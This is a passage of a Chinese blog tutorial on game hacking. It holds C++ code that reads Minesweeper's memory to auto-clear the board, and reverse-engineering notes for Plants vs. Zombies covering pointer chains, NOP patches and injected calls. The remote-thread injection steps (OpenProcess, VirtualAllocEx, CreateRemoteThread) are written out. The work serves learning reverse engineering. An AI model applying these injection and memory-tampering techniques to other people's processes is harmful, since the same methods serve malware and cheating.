class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void CsaoleiDlg::OnBnClickedButton1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20A, 0);  //发送WindowProc的参数</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20B, 0);  //发送WindowProc的参数</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\twhile (TRUE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tOnBnClickedButton1();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t\tOnBnClickedButton2();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t\t/*</span><br><span class=\"line\">\tBOOL ReadProcessMemory(</span><br><span class=\"line\">\t  HANDLE hProcess,</span><br><span class=\"line\">\t  LPCVOID lpBaseAddress,</span><br><span class=\"line\">\t  LPVOID lpBuffer,</span><br><span class=\"line\">\t  DWORD nSize,</span><br><span class=\"line\">\t  LPDWORD lpNumberOfBytesRead</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tHANDLE OpenProcess( </span><br><span class=\"line\">\t  DWORD fdwAccess, </span><br><span class=\"line\">\t  BOOL fInherit, </span><br><span class=\"line\">\t  DWORD IDProcess</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDWORD GetWindowThreadProcessId(</span><br><span class=\"line\">\t  HWND hWnd,</span><br><span class=\"line\">\t  LPDWORD lpdwProcessId</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t*/</span><br><span class=\"line\">\tDWORD pid;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  //通过进程ID拿到进程句柄</span><br><span class=\"line\">\tif (NULL == hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tReadProcessMemory(hProcess, (LPCVOID)0x1005194, &amp;m_editbase1, sizeof(m_editbase1), &amp;pid);</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tDWORD pid;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  //通过进程ID拿到进程句柄</span><br><span class=\"line\">\tif (NULL == hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t&gt; 0x8F是雷，40空白，40对应1，0x10代表行/列结束标识</span><br><span class=\"line\">\t&gt;</span><br><span class=\"line\">\t&gt; 宽基地址 0x01005334</span><br><span class=\"line\">\t&gt;</span><br><span class=\"line\">\t&gt; 高基地址 0x01005338</span><br><span class=\"line\">\t*/</span><br><span class=\"line\"></span><br><span class=\"line\">\tunsigned char gamedata[24][32] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x01005361, &amp;gamedata, 32*24, &amp;pid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开12&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tint dwHigth = 0;</span><br><span class=\"line\">\tm_strshowdata.Empty();</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x01005338, &amp;dwHigth, sizeof(dwHigth), &amp;pid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开13&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCString strTemp = _T(&quot;&quot;);</span><br><span class=\"line\">\t//第一个格子位置</span><br><span class=\"line\">\tshort gamex = 20;</span><br><span class=\"line\">\tshort gamey = 60;</span><br><span class=\"line\">\tunsigned  short xypos[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tfor (int i = 0; i &lt; dwHigth; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tfor (int j = 0; j &lt; 32; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif (0x10 == gamedata[i][j])</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\txypos[0] = gamex + j * 16;</span><br><span class=\"line\">\t\t\txypos[1] = gamey + i * 16;</span><br><span class=\"line\">\t\t\tif (0x8F != gamedata[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t::PostMessage(hWnd, WM_LBUTTONDOWN,MK_LBUTTON,*(int *)xypos);</span><br><span class=\"line\">\t\t\t\t::PostMessage(hWnd, WM_LBUTTONUP,0,*(int *)xypos);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tstrTemp.Format(_T(&quot;%02X &quot;), gamedata[i][j]);</span><br><span class=\"line\">\t\t\tm_strshowdata += strTemp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tm_strshowdata += _T(&quot;\\r\\n&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"5植物大战僵尸\"><a class=\"markdownIt-Anchor\" href=\"#5植物大战僵尸\">#</a> 5. 植物大战僵尸</h3>\n<p>1. 找阳光地址和基地址</p>\n<p>某一个程序每次运行都不改变的地址（基地址）里面存着阳光的地址</p>\n<p>我们需要找到不会改变的地址，通过偏移拿到阳光的地址</p>\n<p>1. 通过 ce 找到阳光地址，并且在 od 中定位</p>\n<p>dd 0F2EE158</p>\n<p>2. 下内存写入断点</p>\n<p>要是 CE 找的地址在 OD 中没有这个地址的话请在 CE 地址右键谁改写了此地址然后对照着到 OD 找</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201211117079.png\" alt=\"image-20221201211117079\"></p>\n<p>第一个偏移地址</p>\n<p>阳光地址 0EDD32F8</p>\n<p>当前阳光地址 = eax + 0x5560     eax=0EDCDD98</p>\n<p>00430A11  |.  0188 60550000 add     dword ptr [eax+5560], ecx</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221202195211747.png\" alt=\"image-20221202195211747\"></p>\n<p>第二个偏移地址，找到谁改了 eax=0EDCDD98 的值</p>\n<p>还是去下内存断点</p>\n<p>00538090  |&gt; \\8B01          |mov     eax, dword ptr [ecx]          ;  PlantsVs.00656CA8</p>\n<p>ecx = 0EDCDD98</p>\n<p>eax = [ecx+5560]</p>\n<p>第三个偏移地址</p>\n<p>0053807D  |.  8B49 08       |mov     ecx, dword ptr [ecx+8]</p>\n<p>eax = [[ecx+8]+5560]     0EDCDD98</p>\n<p>基地址 [[6A9EC0]+768]+5560</p>\n<p>2. 分析金币基地址</p>\n<p>通过 ce 工具收集游戏金币基地址</p>\n<p>可能和金币 1:1，也可能是其他比例</p>\n<p>金币显示的值不是数字 1:1 对应关系，我们只能通过范围搜素定位金币地址</p>\n<p>金币的地址不是绿色的基地址所有，所以我们需要找到基地址 + 偏移地址表示他</p>\n<p>第一个偏移地址 06BA60A0</p>\n<p>0041A3BB - 8B 41 28  - mov eax,[ecx+28]         ECX=06BA6078</p>\n<p>金币的地址 = ecx  + 28</p>\n<p>第二个偏移地址</p>\n<p>0040EB41 - 8B 88 2C080000  - mov ecx,[eax+0000082C]        EAX=02101E48</p>\n<p>金币地址 = [eax+0000082c]+28</p>\n<p>第三个偏移地址</p>\n<p>00467B00 - 8B 0D C09E6A00  - mov ecx,[006A9EC0]</p>\n<p>金币地址 =[[006A9EC0]+82c]+28</p>\n<p>3. 分析植物安放冷却时间</p>\n<p>第一步</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0048728C - 83 47 24 01           - add dword ptr [edi+24],01 &#123; 1 &#125;</span><br><span class=\"line\">00487290 - 8B 47 24              - mov eax,[edi+24]</span><br><span class=\"line\">00487293 - 3B 47 28              - cmp eax,[edi+28]</span><br><span class=\"line\">00487296 - 7E 14                 - jle 004872AC</span><br><span class=\"line\">00487298 - C7 47 24 00000000     - mov [edi+24],00000000 &#123; 0 &#125;</span><br><span class=\"line\">0048729F - C6 47 49 00           - mov byte ptr [edi+49],00 &#123; 0 &#125;</span><br><span class=\"line\">004872A3 - C6 47 48 01           - mov byte ptr [edi+48],01 &#123; 1 &#125;</span><br><span class=\"line\">004872A7 - E8 E4FEFFFF           - call 00487190</span><br><span class=\"line\">004872AC - 8B 47 3C              - mov eax,[edi+3C]</span><br><span class=\"line\"></span><br><span class=\"line\">0BE14EC0</span><br></pre></td></tr></table></figure>\n<p>CD 计数器地址 = edi + 24</p>\n<p>CD 计数器上线 = edi + 28</p>\n<p>思路一：该计数器上限的值，缩短冷却时间</p>\n<p>思路二：改写代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0048728C - 83 47 24 01           - add dword ptr [edi+24],01 &#123; 1 &#125;</span><br><span class=\"line\">00487290 - 8B 47 24              - mov eax,[edi+24]</span><br><span class=\"line\">00487293 - 3B 47 28              - cmp eax,[edi+28]</span><br><span class=\"line\">00487296 - 90                    - nop </span><br><span class=\"line\">00487297 - 90                    - nop </span><br><span class=\"line\">00487298 - C7 47 24 00000000     - mov [edi+24],00000000 &#123; 0 &#125;</span><br><span class=\"line\">0048729F - C6 47 49 00           - mov byte ptr [edi+49],00 &#123; 0 &#125;</span><br><span class=\"line\">004872A3 - C6 47 48 01           - mov byte ptr [edi+48],01 &#123; 1 &#125;</span><br><span class=\"line\">004872A7 - E8 E4FEFFFF           - call 00487190</span><br><span class=\"line\">004872AC - 8B 47 3C              - mov eax,[edi+3C]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3. 分析大嘴花吞噬时间代码</p>\n<p>1. 定位大嘴花吞噬时间计数器变量的地址</p>\n<p>2. 通过 ce 或者 od 定位谁访问了这个地址，从而定位到判断大嘴花吞噬冷却时间的代码</p>\n<p 0=\"\">00461561 - 83 7F 54 00           - cmp dword ptr [edi+54],00</p>\n<p>00461565 - 75 5F                     - jne 004615C6</p>\n<p>4. 分析种植植物 call</p>\n<p>思路：找出安放植物的 call</p>\n<p>1. 通过鼠标右键选中植物的地址</p>\n<p>2. 分析 call 代码参数及堆栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00410A91 - 8B 40 28              - mov eax,[eax+28]</span><br><span class=\"line\">00410A94 - 52                    - push edx</span><br><span class=\"line\">00410A95 - 50                    - push eax</span><br><span class=\"line\">00410A96 - 8B 44 24 20           - mov eax,[esp+20]</span><br><span class=\"line\">00410A9A - 57                    - push edi</span><br><span class=\"line\">00410A9B - 55                    - push ebp</span><br><span class=\"line\">00410A9C - E8 7FC6FFFF           - call 0040D120</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1</span><br><span class=\"line\">push 3</span><br><span class=\"line\">mov eax,1</span><br><span class=\"line\">push 2</span><br><span class=\"line\">push 0EC01BD0</span><br><span class=\"line\">call 0040D120</span><br></pre></td></tr></table></figure>\n<p>3. 注入代码，将自己写的植物安放的汇编代码注入到游戏进程空间中，验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1     ;固定的值</span><br><span class=\"line\">push 2      ;植物类型id,樱桃是2 </span><br><span class=\"line\">mov eax,4   ;x</span><br><span class=\"line\">push 4      ;y</span><br><span class=\"line\">push 147E5FF8    ;[[6A9EC0]+768]</span><br><span class=\"line\">push 0040D120</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>坐标范围为 [4][8] = 5 * 9 = 45</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1     ;固定的值</span><br><span class=\"line\">push 2      ;植物类型id,樱桃是2,坚果3</span><br><span class=\"line\">mov eax,0   ;y 0-4</span><br><span class=\"line\">push 4      ;x 0-8</span><br><span class=\"line\">mov ebx,[6A9EC0]</span><br><span class=\"line\">mov ebx,[ebx+768]</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">push 0040D120</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push -1</span><br><span class=\"line\">push 2</span><br><span class=\"line\">mov eax,0</span><br><span class=\"line\">push 2</span><br><span class=\"line\">mov ebx,[6A9EC0]</span><br><span class=\"line\">mov ebx,[ebx+768]</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">call 0040D120</span><br></pre></td></tr></table></figure>\n<p>5. 远程注入代码</p>\n<p>1. 打开目标进程 OpenProcess，获取目标进程句柄</p>\n<p>2. 在目标进程分配内存空间 VirtualAllocEx</p>\n<p>3. 往分配的内存空间中写入代码</p>\n<p>4. 远程调用 CreateRemoteThread  执行目标进程指定地址的代码</p>\n<p>5. 等待远程线程执行完成  WaitForSingleObject</p>\n<p>6. 释放目标进程空间   VirtualFreeEx</p>\n<p>7. 关闭目标进程句柄</p>\n<p>植物血量</p>\n<p>后台运行  有一个标识 1,0</p>\n<p>关键代码位置 0054E1C2，  0F 95 C0  -&gt; B1 01 90</p>\n<p>毁灭菇</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210004852205.png\" alt=\"image-20221210004852205\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210004902774.png\" alt=\"image-20221210004902774\"></p>\n<p>排错思路：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210211445273.png\" alt=\"image-20221210211445273\"></p>\n<p>到 od 中找到对应位置，查看我们插入的额汇编是否正确</p>\n<p>冰冻</p>\n<p>土豆</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span 